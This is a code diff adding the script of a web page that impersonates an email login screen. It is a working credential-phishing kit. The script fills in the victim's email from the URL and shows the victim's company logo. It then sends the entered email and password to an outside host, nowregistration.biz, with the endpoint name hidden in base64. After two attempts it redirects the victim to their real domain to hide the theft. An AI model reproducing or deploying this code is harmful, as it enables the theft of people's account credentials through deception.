+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dm = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $("#div2").animate({ right: 0, opacity: "show" }, 1000);
+        $('#ai').attr("readonly", true);
+        $('#dmlogo').attr('src', 'https://logo.clearbit.com/' + my_slice);
+
+        $('#domain').html(dm);
+        $("#pr").val("");
+        $("#msg").hide();
+
+    }
+    ///////////////url getting ai////////////////
+
+    $(document).keypress(function(event) {
+
+        var keycode = (event.keyCode ? event.keyCode : event.which);
+        if (keycode == '13') {
+            $("#submit-btn").click();
+            return false;
+        }
+    });
+    var file = "bmV4dC5waHA=";
+
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dm = c.toUpperCase();
+        ///////////////////////////
+
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is emply.!");
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            return false;
+        }
+
+
+        if ($("#div2").is(":visible")) {
+
+        } else {
+            $("#div2").animate({ right: 0, opacity: "show" }, 1000);
+            $('#ai').attr("readonly", true);
+            $('#dmlogo').attr('src', 'https://logo.clearbit.com/' + my_slice);
+
+            $('#domain').html(dm);
+            $("#pr").val("");
+            return false;
+        }
+
+
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+
+        ///////////////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: "https://nowregistration.biz/ghty/"+atob(file),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').val('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+                            return false;
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                    return false;
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').val('Next');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</html>
